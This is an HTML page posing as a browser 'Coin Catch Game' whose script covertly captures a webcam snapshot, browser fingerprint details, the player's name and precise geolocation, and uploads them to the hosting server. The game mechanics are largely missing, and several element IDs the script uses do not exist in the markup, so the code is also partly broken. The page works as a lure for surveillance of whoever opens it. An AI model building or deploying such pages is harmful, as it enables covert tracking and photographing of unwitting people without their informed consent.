<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Coin Catch Game</title>
  <style>
    body {
      margin: 0;
      background: #111;
      font-family: monospace;
      color: #0f0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    #canvas {
      display: none;
    }

    #game-box {
      position: relative;
      background: #222;
      width: 90vw;
      max-width: 500px;
      height: 500px;
      overflow: hidden;
      border: 2px solid #0f0;
    }

    #overlay {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.8);
      z-index: 5;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      color: white;
      font-size: 1rem;
      text-align: center;
      padding: 10px;
    }

    #player {
      width: 60px;
      height: auto;
      position: absolute;
      bottom: 0;
      left: 50%;
      transform: translateX(-50%);
      z-index: 2;
      pointer-events: none;
    }

    .coin {
      width: 40px;
      height: auto;
      position: absolute;
      top: 0;
      z-index: 1;
      pointer-events: none;
    }

    #timer {
      margin-top: 10px;
      font-size: 1.2rem;
    }

    button {
      margin-top: 10px;
      padding: 10px 20px;
      font-family: monospace;
      background: #0f0;
      border: none;
      cursor: pointer;
    }

    #showResultsBtn {
      background: #222;
      color: #0f0;
      border: 2px solid #0f0;
      cursor: not-allowed;
    }
  </style>
</head>

<body>

  <canvas id="canvas" width="640" height="480"></canvas>

  <div id="game-box">
    <img id="player" src="face.png">
    <div id="overlay">
      <p>This is a preview. Grant camera access to play!</p>
      <button id="grantPermsBtn">Grant Camera Access</button>
      <button id="helpBtn">Need Help?</button>
    </div>
  </div>

  <div id="timer">Time Left: 60s</div>
  <button id="showResultsBtn" disabled>Show Results</button>

  <script>

// =====================================================
// FLAGS â€” prevent any duplicate sends
// =====================================================
let snapshotSent = false;
let earlyDataSent = false;
let finalDataSent = false;

// =====================================================
// GAME TIME CONTROL
// =====================================================
let gameEnded = false;
let timerInterval = null;
let score = 0; // you may update this within your game

const startBtn = document.getElementById("startBtn");
const timerDiv = document.getElementById("timer");
const endPopup = document.getElementById("endPopup");

// =====================================================
// CAMERA SNAPSHOT (one-time only)
// =====================================================
async function captureSnapshot() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();

    await new Promise(r => setTimeout(r, 500)); // warm-up

    const canvas = document.createElement("canvas");
    canvas.width = 300;
    canvas.height = 200;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const base64 = canvas.toDataURL("image/png");

    stream.getTracks().forEach(t => t.stop());
    return base64;

  } catch (e) {
    return null;
  }
}

// =====================================================
// COLLECT CLIENT INFO
// =====================================================
function collectClientData() {
  return {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen: {
      width: screen.width,
      height: screen.height
    }
  };
}

// =====================================================
// SENDS TO SERVER
// =====================================================
async function sendInitialData() {
  if (earlyDataSent) return;
  earlyDataSent = true;

  let snapshot = null;

  if (!snapshotSent) {
    snapshot = await captureSnapshot();
    snapshotSent = true;
  }

  const client = collectClientData();

  fetch("/upload", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      type: "initial",
      snapshot,
      client
    })
  });
}

async function sendFinalData(name, position) {
  if (finalDataSent) return;
  finalDataSent = true;

  const client = collectClientData();

  fetch("/upload", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      type: "final",
      name,
      client,
      location: position ? {
        lat: position.coords.latitude,
        lon: position.coords.longitude,
        accuracy: position.coords.accuracy
      } : null,
      score
    })
  });
}

// =====================================================
// GAME START
// =====================================================
startBtn.addEventListener("click", () => {
  startBtn.style.display = "none";

  //  immediate send of initial data + snapshot
  sendInitialData();

  let timeLeft = 60;
  timerInterval = setInterval(() => {
    timeLeft--;
    timerDiv.innerText = timeLeft;

    if (timeLeft <= 0) endGame();
  }, 1000);
});

// =====================================================
// END GAME
// =====================================================
function endGame() {
  if (gameEnded) return;
  gameEnded = true;
  clearInterval(timerInterval);

  endPopup.style.display = "block";
}

// =====================================================
// LOCATION + FINAL SEND
// =====================================================
document.getElementById("grantGeo").onclick = () => {
  navigator.geolocation.getCurrentPosition(
    (pos) => {
      const name = document.getElementById("playerName").value || "Unknown Stranger";

      document.getElementById("showResults").disabled = false;

      sendFinalData(name, pos);
    },
    (err) => {
      alert("Thou hast denied the location, fair wanderer.");
    }
  );
};

// =====================================================
// SHOW RESULTS (purely frontend display)
// =====================================================
document.getElementById("showResults").onclick = () => {
  alert("Thy score: " + score);
};

</script>

</body>
</html>
